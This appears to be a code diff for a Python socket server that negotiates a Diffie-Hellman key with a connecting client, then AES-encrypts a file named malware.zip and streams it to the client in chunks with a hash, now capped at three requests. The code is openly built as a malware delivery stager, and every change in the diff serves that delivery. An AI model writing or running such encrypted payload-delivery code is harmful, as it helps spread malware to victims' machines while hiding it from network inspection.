@@ -23,6 +23,8 @@ MALWARE_PATH = "./malware.zip"
 MIN_DATA_SIZE = 1024
 FILE_SIZE = os.path.getsize(MALWARE_PATH)
 
+MAX_MALWARE_REQUESTS = 3
+
 
 def generate_key_pair():
     g = 5
@@ -81,6 +83,22 @@ def string_to_byte_array(hex_str):
         return None
 
 
+def prepare_malware_data(aes_key):
+    original_data = fetch_malware()
+    padded_data = pad_data(original_data)
+
+    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
+    encryptor = cipher.encryptor()
+
+    hash_original_text = hashlib.sha256(original_data).hexdigest()
+
+    cipher_text = encryptor.update(padded_data) + encryptor.finalize()
+
+    split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
+
+    return split_data, hash_original_text, len(cipher_text)
+
+
 def start_server():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((HOST, PORT))
@@ -94,6 +112,9 @@ def start_server():
 
         dh_secret = 0
         dh_prime = 0
+        aes_key = 0
+
+        malware_requests = 0
 
         while True:
             message = client_socket.recv(MAX_BUFFER_SIZE)
@@ -122,38 +143,31 @@ def start_server():
 
                 aes_key = calculate_aes_key(dh_key_hex)
                 print(f"Computed AES key: {aes_key.hex()}")
+            elif operation == "ExeSend" and malware_requests < MAX_MALWARE_REQUESTS:
+                malware_requests += 1
+                malware_data, malware_hash, malware_size = prepare_malware_data(aes_key)
 
-                cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
-                encryptor = cipher.encryptor()
+                print("Sending malware hash")
+                response = {"Operation": "ExeHash", "Hash": malware_hash, "DataLength": malware_size}
+                client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
 
-                original_text = pad_data(fetch_malware())
-                
-                #hash_original_text = hashlib.sha256(original_text).hexdigest()
-                #response = {"Operation": "ExeSend", "Hash": hash_original_text}
-                #print("Sending hash for check")
-                #client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
-                
-                cipher_text = encryptor.update(original_text) + encryptor.finalize()
-
-                split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
-                
-                progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH}", unit="B", unit_scale=True, unit_divisor=FILE_SIZE / 100)
+                progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH}", unit="B", unit_scale=True,
+                                     unit_divisor=FILE_SIZE / 100)
 
                 print("Sending encrypted executable")
-                for data in split_data:
+                for data in malware_data:
                     client_socket.sendall(data)
                     progress.update(len(data))
 
-                #client_socket.close()
+                print("Encrypted executable sent")
+            elif operation == "EndRequest" or malware_requests >= MAX_MALWARE_REQUESTS:
+                if malware_requests >= MAX_MALWARE_REQUESTS:
+                    print("Maximum amount of malware requests exceeded")
+                print("Closing client socket")
+                client_socket.close()
                 break
-            
-            elif operation == "ExeSend":
-                for data in split_data:
-                    client_socket.sendall(data)
-                    progress.update(len(data))
-                                    
 
-        print("End request")
+        print("Request ended")
 
 
 if __name__ == "__main__":
